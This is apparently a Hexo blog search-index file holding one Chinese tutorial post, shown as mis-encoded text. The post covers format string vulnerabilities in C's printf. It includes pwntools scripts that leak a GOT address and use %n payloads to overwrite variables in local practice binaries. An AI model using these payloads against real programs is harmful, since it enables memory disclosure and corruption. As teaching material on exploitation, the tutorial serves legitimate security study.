{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"æ ‡ç­¾","date":"2025-07-21T01:52:05.551Z","updated":"2025-07-21T01:52:05.551Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2025-07-21T01:51:03.000Z","updated":"2025-07-21T01:51:03.362Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","date":"2025-07-21T01:05:48.000Z","updated":"2025-07-21T13:35:26.315Z","comments":true,"path":"2025/07/21/æ ¼å¼åŒ–å­—ç¬¦ä¸²/","permalink":"http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"åŸç†æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å®ƒè§£æä¹‹åçš„å‚æ•°ã€‚ é€šä¿—æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ä½œç”¨æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­çš„æ•°æ®è½¬åŒ–ä¸ºäººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š (1ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚ (2ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚ (3ï¼‰åç»­å‚æ•°ï¼Œå¯é€‰ã€‚ ç”¨printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalaryï¼‰ printfå‡½æ•°å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼Œâ€name:%s,age:%d,salary:%4.2fâ€å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œâ€œmyname,myage,mysalaryâ€å«ä½œåç»­å‚æ•°ã€‚ ğŸ§± å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å· æ ¼å¼ç¬¦ ä½œç”¨ ç¤ºä¾‹ %x&#x2F;%p ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ ˆä¸Šçš„å€¼ %xâ†’0xdeadbeef %pé€šå¸¸å¸¦0xå‰ç¼€ %d&#x2F;%u ä»¥åè¿›åˆ¶è¾“å‡ºæ ˆä¸Šçš„å€¼ %dâ†’3735928559 %c è¾“å‡ºæ ˆä¸Šå€¼çš„æœ€ä½ä¸€ä¸ªå­—èŠ‚ %câ†’&#39;A&#39; %s æŠŠæ ˆä¸Šçš„å€¼å½“ä½œåœ°å€ï¼Œè¾“å‡ºè¯¥åœ°å€çš„å­—ç¬¦ä¸² %sâ†’&quot;Hello&quot; %hn å†™å…¥ 2 å­—èŠ‚ï¼ˆshortï¼‰ %hnâ†’ å†™å…¥ä½ 2 å­—èŠ‚ %hhn å†™å…¥ 1 å­—èŠ‚ï¼ˆcharï¼‰ %hhnâ†’ å†™å…¥ä½ 1 å­—èŠ‚ %n å°†å·²è¾“å‡ºå­—ç¬¦æ•°å†™å…¥æ ˆä¸Šçš„åœ°å€ %nâ†’ å†™å…¥0x4åˆ°æŒ‡å®šåœ°å€ %$p&#x2F;%%$s æŒ‡å®šç¬¬å‡ ä¸ªå‚æ•°ä½ç½®çš„å€¼ %4$pâ†’ ç¬¬ 4 ä¸ªå‚æ•° %% è¾“å‡ºä¸€ä¸ª%å­—ç¬¦æœ¬èº« %%â†’% å½“ç”¨æˆ·æ§åˆ¶äº† printf() çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰ï¼Œè€Œç¨‹åºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–é™åˆ¶ï¼Œå°±å¯èƒ½é€ æˆä»¥ä¸‹é—®é¢˜ï¼š 123char input[100];fgets(input, sizeof(input), stdin);printf(input); // âš ï¸ å±é™©ï¼ç”¨æˆ·è¾“å…¥ç›´æ¥ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸² æ­¤æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ è¾“å…¥ï¼Œå¦‚ï¼š %x %x %x %x %s ç¨‹åºä¼šå°è¯•ä»æ ˆä¸­è¯»å–å‚æ•°ï¼Œä½†ç”±äºæ²¡æœ‰æä¾›å‚æ•°åˆ—è¡¨ï¼Œprintf() ä¼šç»§ç»­ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ã€‚è¿™å¯èƒ½å¯¼è‡´ï¼š æ³„éœ²æ ˆå†…å­˜å†…å®¹ï¼ˆå¦‚è¿”å›åœ°å€ã€canaryã€å‡½æ•°æŒ‡é’ˆç­‰ï¼‰ å†™å…¥å†…å­˜ï¼ˆé€šè¿‡ %n æ ¼å¼ç¬¦ï¼‰ è™½ç„¶æ²¡æœ‰å†™ä»»ä½•å‚æ•°ï¼Œä½†è¿˜æ˜¯ä¼šå¯¹åº”åœ°è§£æå‚æ•°ï¼Œå› ä¸ºåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­å†™äº†å¯¹åº”çš„è§£ææ–¹å¼ï¼Œæ‰€ä»¥åœ¨åç»­çš„å‡½æ•°è¿è¡Œä¸­ä¼šè§£ææ ˆä¸Šçš„å…ƒ ç´ ã€‚å¯¹äºæ•´å‹å€¼å’Œæµ®ç‚¹å€¼ï¼Œè¿™æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä¸ç®¡æ ˆä¸Šæ˜¯ä»€ä¹ˆæ•°æ®éƒ½èƒ½å¤ŸæŒ‰ç…§æ•´å‹å€¼å’Œæµ®ç‚¹å€¼è§£æå‡ºæ¥ï¼Œè€Œå­—ç¬¦ä¸²å½¢å¼å°±ä¸ä¸€å®šèƒ½è§£æå‡ºæ¥ äº†ã€‚å¦‚æœæ˜¯ä¸€ä¸ªéæ³•åœ°å€ï¼Œæ¯”å¦‚NULLï¼Œé‚£ä¹ˆåœ¨è§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œ å› ä¸ºè¿™ä¸ªåœ°å€æŒ‰ç…§å­—ç¬¦ä¸²è§£ææ˜¯æ— æ³•è§£æå‡ºæ¥çš„ï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚è¿™å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŸºæœ¬åŸç† åˆ©ç”¨leakmemory(æ³„éœ²æ ˆä¸Šå†…å®¹) ç”¨äº† %100s æ¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºï¼Œä½†å¹¶æ²¡æœ‰é™åˆ¶ç”¨æˆ·è¾“å…¥çš„æ ¼å¼ç¬¦å†…å®¹ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š ç”¨æˆ·å¯ä»¥è¾“å…¥ %xã€%sã€%n ç­‰æ ¼å¼ç¬¦ã€‚ printf ä¼šæ ¹æ®è¿™äº›æ ¼å¼ç¬¦ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„éœ²æˆ–ä»»æ„åœ°å€å†™å…¥ã€‚ leakmemory(æ³„éœ²ä»»æ„åœ°å€å†…å­˜)è¿™é‡Œçš„ç›®æ ‡è®¾ç«‹æ³„éœ²isoc99_scanfå‡½æ•°ï¼ˆscanfç¼–è¯‘ä¹‹åæ˜¯isoc99_scanfåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼‰ã€‚ %k$s è¿™é‡Œçš„pæ˜¯å¯ä»¥æ›´æ¢çš„ï¼Œæ¯”å¦‚æ›´æ¢ä¸ºså°±å¯ä»¥è§£ææ ˆä¸Šçš„æ•°æ®ä¸ºå­—ç¬¦ä¸²ã€‚ kï¼šè¡¨ç¤ºè¦æ‰“å°çš„å‚æ•°è·ç¦»ç›®å‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„è·ç¦»ã€‚ å› ä¸ºåœ¨æ²¡æœ‰ç»™printfæä¾›å¯¹åº”çš„å­—ç¬¦ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªå¯å˜å‚æ•°å‡½æ•° ï¼Œå®ƒä¼šä»æ ˆä¸Šä¾æ¬¡è¯»å–æ•°æ®æ¥å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ %pã€%xã€%sã€%n ç­‰æŒ‡ä»¤ã€‚ ä½†ä½ å¹¶ä¸çŸ¥é“ä½ è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„å…·ä½“ä½ç½®ï¼Œæ‰€ä»¥ä½ éœ€è¦ï¼š æ‰¾åˆ°ä½ çš„è¾“å…¥å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„åç§»é‡ï¼Œæ‰èƒ½ç²¾å‡†æ§åˆ¶è¯»å†™çš„å†…å®¹ã€‚ æ‰€ä»¥åç§»é‡å°±æ˜¯4 æ‰€ä»¥æ„é€ payload &#x3D; p32(scanf_got) + â€œ%4$sâ€ ç›¸å½“äºprint(p32(scanf_got) + â€œ%4$sâ€) æ‰€ä»¥å‰å››ä¸ªå­—èŠ‚æ˜¯è¾“å‡ºçš„scanfçš„gotè¡¨ ğŸ§  å…³é”®åŒºåˆ«ï¼šåœ°å€ vs åœ°å€çš„å†…å®¹ scanf_got GOT è¡¨ä¸­scanfçš„åœ°å€ï¼ˆ.gotæ®µä¸­çš„ä¸€ä¸ªä½ç½®ï¼‰ 0x804a008 å°±åƒä¹¦çš„ç›®å½•é¡µç  æ³„éœ²çš„åœ°å€ï¼ˆleak_addrï¼‰ è¿™ä¸ª GOT è¡¨é¡¹ä¸­å­˜å‚¨çš„å€¼ï¼ˆå³scanfçš„å®é™…åœ°å€ï¼‰ 0xf7e01234 å°±åƒç›®å½•é¡µç æŒ‡å‘çš„é‚£ä¸€é¡µçš„å†…å®¹ è„šæœ¬1234567891011121314from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive() printf æ‰§è¡Œæµç¨‹ï¼š printf ä¼šä»æ ˆä¸Šè¯»å–å‚æ•°ï¼› å®ƒçœ‹åˆ° %4$sï¼Œä¼šä»ç¬¬ 4 ä¸ªå‚æ•°ä½ç½®è¯»å–ä¸€ä¸ªåœ°å€ï¼› è¿™ä¸ªåœ°å€æ˜¯ 0x804a018ï¼ˆä½ å†™å…¥çš„ GOT åœ°å€ï¼‰ï¼› ç„¶åä» 0x804a018 åœ°å€ä¸­è¯»å‡ºä¸€ä¸ªæŒ‡é’ˆï¼ˆæ¯”å¦‚ 0xf7e01234ï¼Œå³ scanf çš„è¿è¡Œæ—¶åœ°å€ï¼‰ï¼› %s ä¼šä» 0xf7e01234 å¼€å§‹è¯»å–å­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ° \\0ï¼› æœ€ç»ˆä½ æ¥æ”¶åˆ°çš„æ•°æ®ä¸­åŒ…å« 0xf7e01234ã€‚ ğŸ“Œ æ€»ç»“ elf.got[&quot;scanf&quot;]å’Œelf.got[&quot;__isoc99_scanf&quot;]ä¸€æ ·å—ï¼Ÿ ä¸ä¸€å®šï¼Œå–å†³äºç¼–è¯‘å™¨ ä¸ºä»€ä¹ˆä¼šæœ‰__isoc99_scanfï¼Ÿ GCC ç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒ C99 æ ‡å‡†å¼•å…¥çš„ æ€ä¹ˆç¡®è®¤ç”¨å“ªä¸ªï¼Ÿ ç”¨readelf -ræˆ–objdump -TRæŸ¥çœ‹ GOT è¡¨ èƒ½ä¸èƒ½æ›¿æ¢ï¼Ÿ åªæœ‰ GOT è¡¨ä¸­å­˜åœ¨å¯¹åº”ç¬¦å·æ—¶æ‰èƒ½æ›¿æ¢ å¦‚æœå†™é”™äº†ä¼šæ€æ ·ï¼Ÿ æŠ¥é”™ï¼šKeyError å‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹ğŸŒŸ é˜¶æ®µ 0ï¸âƒ£ï¼šåœ¨ vulnfunc é‡Œï¼ˆè°ƒç”¨ printf ä¹‹å‰ï¼‰ è¿™æ˜¯å·²ç»åœ¨ vulnfunc é‡Œï¼Œä¸”æ ˆå¸§å·²ç»å»ºç«‹å¥½äº†ã€‚ æ ˆé¡¶åœ¨ espï¼Œæ ˆä½åœ¨é«˜åœ°å€æ–¹å‘ã€‚ 12345678910111213 â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆå¯èƒ½æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼‰ || å‚æ•°2 || å‚æ•°1 |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp | â† ebp (vulnfunc çš„ ebp)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡ || â€¦ | â† esp ï¼ˆåœ¨ vulnfunc é‡Œï¼‰ â†“ ä½åœ°å€ å½“ä½ åˆšè¿›å…¥ vulnfuncï¼š ebp â†’ ä¸Šä¸€ä¸ª ebp ebp+4 â†’ è¿”å›åœ°å€ï¼ˆè¿”å›åˆ° mainï¼‰ ebp-xx â†’ vulnfunc çš„å±€éƒ¨å˜é‡ esp â†’ æœ€ä½å¤„ï¼ŒæŒ‡å‘å±€éƒ¨å˜é‡ ğŸŒŸ é˜¶æ®µ 1ï¸âƒ£ï¼šè°ƒç”¨ printf(format) å½“ vulnfunc è°ƒç”¨ï¼š 12printf(format); è°ƒç”¨è€…æŠŠè¿”å›åœ°å€ &amp; å‚æ•°å‹å…¥æ ˆï¼š 1234567891011121314 â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰ || â€¦ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp | â† ebp (vulnfunc)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°1=format | â† esp+4| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡ | â† esp â†“ æ­¤æ—¶ esp æŒ‡å‘ printf çš„è¿”å›åœ°å€ï¼Œå†å¾€ä¸Šæ˜¯ printf çš„å‚æ•°ã€‚ ğŸŒŸ é˜¶æ®µ 2ï¸âƒ£ï¼šè¿›å…¥ printf å åœ¨ printf å¼€å§‹æ‰§è¡Œåï¼Œå®ƒå»ºç«‹è‡ªå·±çš„æ ˆå¸§ï¼š 1234567891011121314151617 â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰ || â€¦ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp | â† ebp (vulnfunc)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°1=format | â† ebp+8| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡ | â† ebp+4| ä¸Šä¸€ä¸ª ebp | â† ebp (printf)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| printf å±€éƒ¨å˜é‡ | â† esp â†“ è¿™é‡Œï¼š printf æŠŠå½“å‰çš„ ebp å‹æ ˆ æŠŠ ebp è®¾ç½®ä¸º esp esp å†å‘ä¸‹ç•™å‡ºå±€éƒ¨å˜é‡ç©ºé—´ scanfå‡½æ•°ä¼šæŠŠè¯»å–åˆ°çš„æ•°æ”¾åœ¨æ ˆä¸Šä¸€ä¸ªç©ºé—´ï¼Œç„¶å%pä¼šæŠŠå®ƒæ³„éœ²å‡ºæ¥ ä½¿ç”¨ scanf è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæœ€å¤š 100 å­—èŠ‚ï¼‰ï¼Œå­˜å…¥ format ç¼“å†²åŒºï¼› ç„¶åç›´æ¥å°†è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ ç»™ printfï¼Œå³ï¼šprintf(format); overwrite(è¦†ç›–ä»»æ„åœ°å€å†…å­˜) æ‰€ä»¥è¿™é“é¢˜çš„é‡ç‚¹æ˜¯ä¿®æ”¹å‡ ä¸ªæ•°çš„å€¼ 1ï¼‰å°†aè¦†ç›–ä¸º0x10ã€‚ 2ï¼‰å°†bè¦†ç›–ä¸º2ã€‚ 3ï¼‰å°†cè¦†ç›–ä¸º0x12345678ã€‚ å…¶ä¸­aæ˜¯å±€éƒ¨å˜é‡ï¼Œb,cæ˜¯å…¨å±€å˜é‡ å±€éƒ¨å˜é‡å­˜å‚¨åœ¨æ ˆä¸Šï¼Œå…¨å±€å˜é‡å­˜å‚¨åœ¨æ•°æ®æ®µä¸­ï¼ˆåˆ†ä¸ºå·²åˆå§‹åŒ–rodataå’Œæœªåˆå§‹åŒ–bssä¸¤éƒ¨åˆ†ï¼‰ 12345678910111213141516171819202122232425262728+---------------------+ &lt;--- é«˜å†…å­˜åœ°å€| å‘½ä»¤è¡Œå‚æ•° &amp; ç¯å¢ƒå˜é‡ |+---------------------+| æ ˆ (Stack) | &lt;-- å±€éƒ¨å˜é‡ã€å‡½æ•°å‚æ•°ã€è¿”å›åœ°å€| || Function Call N || (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|| Function Call 2 || (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|| Function Call 1 || (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|| ... || || ç©ºé—² || |+---------------------+| å † (Heap) | &lt;-- åŠ¨æ€åˆ†é…å†…å­˜ (malloc/new)| || ... |+---------------------+| .bss æ®µ (æœªåˆå§‹åŒ–æ•°æ®) | &lt;-- æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: b)+---------------------+| .data æ®µ (å·²åˆå§‹åŒ–æ•°æ®) | &lt;-- å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: c)+---------------------+| .text æ®µ (ä»£ç ) | &lt;-- ç¨‹åºæ‰§è¡Œä»£ç  (æŒ‡ä»¤)+---------------------+| ä¿ç•™åŒºåŸŸ |+---------------------+ &lt;--- ä½å†…å­˜åœ°å€ açš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰é¦–å…ˆï¼Œaæ˜¯å±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šçš„ï¼Œå…¶åœ°å€ä¼šå› ä¸ºå¼€å¯ASLRè€Œå˜åŒ–ï¼Œæ‰€ä»¥åœ¨å‡½æ•°ä¸­å°†açš„åœ°å€æ‰“å°å‡ºæ¥äº† è„šæœ¬ 12345678from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m) intå’Œu32() å‡½æ•° int(..., 16) æ¥æ”¶åˆ°çš„æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„åœ°å€ï¼ˆå¦‚&quot;0xffa79dbc&quot;ï¼‰ è½¬æ¢ä¸ºæ•´æ•°åœ°å€ ä¸»åŠ¨æ³„éœ²åœ°å€ u32(...) æ¥æ”¶åˆ°çš„æ˜¯åŸå§‹ 4 å­—èŠ‚æ•°æ®ï¼ˆå¦‚b&#39;\\xbc\\x9d\\xa7\\xff&#39;ï¼‰ å°†å°ç«¯åºçš„ 4 å­—èŠ‚è½¬ä¸ºæ•´æ•° è°ƒç”¨æ³„éœ²åœ°å€ ğŸ§© p32(a_addr) æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ æ„é€ çš„ p32(a_addr) ä¼šè¢« printf å½“ä½œä¸€ä¸ªå‚æ•°å¤„ç†ï¼š å®ƒè¢«å‹å…¥æ ˆä¸Šï¼› %8$n ä¼šä»ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®è¯»å–å®ƒï¼› è¿™ä¸ªåœ°å€å°±æ˜¯å†™å…¥çš„ç›®æ ‡åœ°å€ã€‚ ğŸ§© %12c æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿï¼ˆç›®æ ‡æ˜¯16ï¼Œaçš„åœ°å€å å››ä¸ªå­—èŠ‚ï¼‰ %12c è¾“å‡º 12 ä¸ªå­—ç¬¦ï¼ˆå¦‚ç©ºæ ¼ï¼‰ï¼› %n ä¼šæŠŠå½“å‰è¾“å‡ºçš„å­—ç¬¦æ€»æ•°å†™å…¥æŒ‡å®šåœ°å€ï¼› æ‰€ä»¥ %12c çš„ä½œç”¨æ˜¯è®© %n å†™å…¥ 12ï¼› å®ƒæœ¬èº«ä¸å†™å…¥å†…å­˜ï¼Œä½†ä¼šå½±å“ %n çš„å€¼ã€‚ ä¸èƒ½æ¢æˆbâ€™aâ€™*12,è¿™ä¸ªä¸ä¼šå½±å“%nçš„æ€»æ•° å·¥ä½œåŸç†ï¼š å½“ printf(payload) æ‰§è¡Œæ—¶ï¼Œpayload å­—ç¬¦ä¸²ä¼šè¢«æ”¾åˆ°æ ˆä¸Šã€‚ printf å¼€å§‹è§£æ payloadã€‚å®ƒä¼šæŠŠ p32(a_addr) è§†ä¸ºä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ï¼ˆä½†å®ƒå®é™…ä¸Šæ˜¯ v1 çš„åœ°å€ï¼‰ã€‚ ç„¶åé‡åˆ° %12cï¼Œå®ƒè¾“å‡º 12 ä¸ªå­—ç¬¦ã€‚ æ¥ç€é‡åˆ° %8$nã€‚æ­¤æ—¶ printf å·²ç»è¾“å‡ºäº† 12 ä¸ªå­—ç¬¦ã€‚å®ƒä¼šå»æ ˆä¸Šå¯»æ‰¾ç¬¬ 8 ä¸ªå‚æ•°çš„åœ°å€ã€‚ç”±äº p32(a_addr) æ”¾åœ¨äº† payload çš„å¼€å¤´ï¼Œå¹¶ä¸”å…¶é•¿åº¦æ˜¯ 4 å­—èŠ‚ï¼Œå®ƒä¼šæ­£å¥½è½åœ¨æ ˆä¸Šç¬¬ 8 ä¸ªå‚æ•°çš„ä½ç½®ä¸Šï¼ˆè¿™ä¸ªåç§»é‡æ˜¯ç»è¿‡è°ƒè¯•ç¡®å®šçš„ï¼‰ã€‚ printf ä¼šå°†å½“å‰å·²è¾“å‡ºçš„å­—ç¬¦æ•° 12 å†™å…¥åˆ° p32(a_addr) æ‰€è¡¨ç¤ºçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡ v1 çš„åœ°å€ã€‚ æœ€ç»ˆï¼Œv1 çš„å€¼è¢«ä¿®æ”¹ä¸º 12ã€‚ bçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰ b,cçš„åœ°å€å¯ä»¥ç›´æ¥æ‰¾åˆ° è„šæœ¬ 1234567891011121314from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info: print(b&quot;Success\\n&quot;)p.interactive() ä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ç…§è¦†ç›– a çš„æ–¹æ³•ï¼Ÿï¼ˆå› ä¸º%nï¼Œbçš„åœ°å€å·²ç»è¶…è¿‡2äº†ï¼Œæ‰€ä»¥bçš„åœ°å€åªèƒ½åœ¨%_$nä¹‹åï¼‰ åç§»é‡è®¡ç®—çš„å·®å¼‚ï¼š åœ¨è¦†ç›– a çš„æ–¹æ³•ä¸­ï¼Œp32(a_addr) æ”¾åœ¨äº† payload çš„æœ€å¼€å¤´ï¼Œå¹¶ä¸” printf å‘ç°è¿™ä¸ªå¼€å¤´åœ¨å®ƒçš„å‚æ•°åˆ—è¡¨ä¸­æ˜¯ç¬¬ 8 ä¸ªã€‚ ä½†æ˜¯ï¼Œå¦‚æœå°† p32(b_addr) ä¹Ÿæ”¾åœ¨ payload çš„å¼€å¤´å¹¶å°è¯•ç”¨ %8$n å†™å…¥ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜ï¼š åœ°å€å€¼ä¸æ ¼å¼ç¬¦å†²çªï¼š0x0804A028 è¿™ä¸ªåœ°å€æœ¬èº«å¦‚æœè¢« printf è§£ææˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå¯èƒ½ä¼šåŒ…å« % æˆ–å…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¼è‡´ printf å´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚ä¾‹å¦‚ï¼Œåœ°å€çš„æŸä¸ªå­—èŠ‚å¯èƒ½è¢«è§£é‡Šä¸º %s æˆ– %x çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´ printf è¯•å›¾è¯»å–æ— æ•ˆçš„å†…å­˜åœ°å€ã€‚ æ§åˆ¶æ€§é—®é¢˜ï¼šæˆ‘ä»¬é€šå¸¸å¸Œæœ›å°†è¦å†™å…¥çš„åœ°å€æ”¾åœ¨æ ¼å¼å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢« printf è¯¯è®¤ä¸ºæ˜¯æ ¼å¼ç¬¦çš„ä¸€éƒ¨åˆ†æ¥å¤„ç†ï¼Œè€Œåªæ˜¯ä¸€ä¸ªæ™®é€šçš„ 4 å­—èŠ‚æ•°æ®ã€‚ ç‰¹æ€§ è¦†ç›– v1 (å±€éƒ¨å˜é‡) è¦†ç›– b (å…¨å±€å˜é‡) ç›®æ ‡ç±»å‹ æ ˆä¸Šçš„å±€éƒ¨å˜é‡ æ•°æ®æ®µä¸Šçš„å…¨å±€å˜é‡ åœ°å€æ¥æº è¿è¡Œæ—¶æ³„éœ² (æ¯æ¬¡å¯èƒ½ä¸åŒ) é™æ€å›ºå®š 